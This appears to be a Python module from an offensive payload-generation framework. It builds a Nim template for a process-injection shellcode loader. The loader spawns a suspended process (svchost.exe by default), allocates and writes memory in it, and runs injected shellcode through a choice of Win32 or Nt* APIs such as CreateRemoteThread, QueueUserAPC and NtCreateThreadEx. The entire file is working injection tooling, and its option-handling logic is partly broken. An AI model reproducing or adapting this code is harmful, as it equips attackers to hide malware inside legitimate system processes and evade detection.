from string import Template
from common.utils.argumentparser import ArgumentParser

class spawnandinject:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='spawn', default='CreateProcessA', help='Which function to use to spawn a new process', choices={'CreateProcessA', 'NtCreateUserProcess'})
        parser.add_argument(name='allocate', default='VirtualAllocEx', help='Function to use for allocating memory', choices={'VirtualAllocEx', 'NtAllocateVirtualMemory'})
        parser.add_argument(name='write', default='WriteProcessMemory', help='Function used for writing memory', choices={'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='execute', default='CreateRemoteThread', help='Function used for executing the shellcode', choices={'CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread'})
        parser.add_argument(name='protect', default='VirtualProtectEx', help='Function used for changing memory protections', choices={'VirtualProtectEx', 'NtProtectVirtualMemory'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish. Only applicable for CreateRemoteThread and NtCreateThreadEx', choices={'WaitForSingleObject', 'NtWaitForSingleObject', 'None'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='target', default='C:\\\\windows\\\\system32\\\\svchost.exe', help='Target process for spawning or injecting', choices={})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)     

        if self.args['execute'] not in ['WaitForSingleObject', 'NtWaitForSingleObject']:
            self.args['wait'] = 'None'

    def imports(self) -> list[str]:
        return ['import winim/lean']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = """
    {transformers}
"""

        if self.args['spawn'] == 'CreateProcessA':
            template += Template("""
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION

    si.cb = sizeof(si).DWORD

    discard {CreateProcessA}(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
""").substitute(target=self.args['target'])

        if self.args['allocate'] == 'VirtualAllocEx':
            template += """
    let address = {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    var address: pointer
    var regionSize: uint64 = {shellcodeSize}
    discard {NtAllocateVirtualMemory}(pi.hProcess, &address, NULL, &regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
"""

        if self.args['write'] == 'WriteProcessMemory':
            template += """
    discard {WriteProcessMemory}(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
"""
        elif self.args['write'] == 'NtWriteVirtualMemory':
            template += """
    var numWritten: uint64
    discard {NtWriteVirtualMemory}(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, &numWritten)
"""

        if self.args['protect'] == 'VirtualProtectEx':
            template += Template("""
    var oldProtect: DWORD
    discard {VirtualProtectEx}(pi.hProcess, address, {shellcodeSize}, $perm, &oldProtect)
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    var oldProtect: ULONG
    var regSize: uint64 = {shellcodeSize}
    discard {NtProtectVirtualMemory}(pi.hProcess, &address, &regSize, $perm, &oldProtect)
""").substitute(perm=self.args['perm'])


        if self.args['execute'] == 'CreateRemoteThread':
            template += """
    let hThread = {CreateRemoteThread}(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    var hThread: HANDLE
    discard {NtCreateThreadEx}(&hThread, 0x001FFFFF, NULL, pi.hProcess, address, NULL, 0, 0, 0, 0, NULL)
"""
        elif self.args['execute'] == 'QueueUserAPC':
            template += """
    discard {QueueUserAPC}(cast[PAPCFUNC](address), pi.hThread, cast[ULONG_PTR](0))
"""
        elif self.args['execute'] == 'NtQueueApcThread':
            template += """
    discard {NtQueueApcThread}(pi.hThread, address, nil, nil, nil)
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(hThread, int32(500))
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
    var timeout: LARGE_INTEGER
    timeout.QuadPart = -500000
    discard {NtWaitForSingleObject}(hThread, 0, &timeout)
"""
        elif self.args['wait'] == 'None':
            template += """
    discard {ResumeThread}(pi.hThread);
"""

        return template